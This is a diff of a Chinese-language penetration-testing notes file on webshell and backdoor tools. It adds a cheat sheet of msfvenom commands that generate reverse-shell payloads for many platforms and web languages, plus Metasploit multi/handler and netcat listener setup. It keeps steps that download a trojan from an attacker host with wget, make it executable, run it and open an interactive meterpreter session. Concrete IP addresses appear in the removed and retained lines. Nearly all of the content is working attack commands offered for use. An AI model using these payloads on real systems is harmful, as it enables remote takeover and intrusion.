@@ -33,38 +33,70 @@ WebShell管理工具
 	+ 支持asp，jsp，php，支持HTTPS。
 	+ 非通用后门。
 - Metasploit生成后门
-	+ ``msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.131 -f asp > shell.asp`` 
-	+ ``msfvenom  -p linux/x64/meterpreter/reverse_tcp LHOST=118.195.199.66 LPORT=7777 -f elf > shell_x64.elf``
-	+ 开启C2服务
+	+ 基本参数
+		::
+		
+			e 编码方式
+			i 编码次数
+			b 在生成的程序中避免出现的值
+			f 输出格式
+			p 选择payload
+			l 查看所有payload
+			a 选择架构平台(x86|x64|x86_64)
+			o 文件输出
+			c 添加自己的shellcode
+			x|k 捆绑
+	+ 基本格式：``msfvenom -p <payload> <payload options> -f <format> -o <path>``
+	+ 示例
+		::
+		
+			Binaries
+				Linux：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
+				Windows：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
+				Mac：msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
+				Android：msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> R > shell.apk
+			Web Payloads
+				php：msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+					cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+				asp：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+				jsp：msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+				WAR：msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+			Scripting Payloads
+				Python：msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
+				Bash：msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+				Perl：msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
+			Shellcode
+				Linux Based Shellcode：msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+				Windows Based Shellcode ：msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+				Mac Based Shellcode：msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
+	+ Handlers
 		::
 		
 			use exploit/multi/handler
-			set PAYLOAD windows/meterpreter/reverse_tcp
-			set LHOST 10.10.10.131
-			set LPORT 7777
-			exploit
+			set PAYLOAD <Payload name>
+			set LHOST <LHOST value>
+			set LPORT <LPORT value>
+			set ExitOnSession false
+			exploit -j -z
+			或
+			nc -lvp port
 			
 	+ 上传木马
-		
 		::
-		
 		
 			命令执行上传：
 			system('wget http://10.10.10.131/shell_x64.elf -P /tmp/')
 			
 	+ 执行木马
-	
 		::
-			
+		
 			system('chmod 777 /tmp/shell_x64.elf')
 			system('/tmp/shell_x64.elf')
 			注意tmp目录有写入执行权限。
 		
 			web页面：system("curl http://10.10.10.131/shell.asp")
-				
 	+ 交互
 		::
-		
 		
 			进入交互页面meterpreter会话执行以下：
 			shell
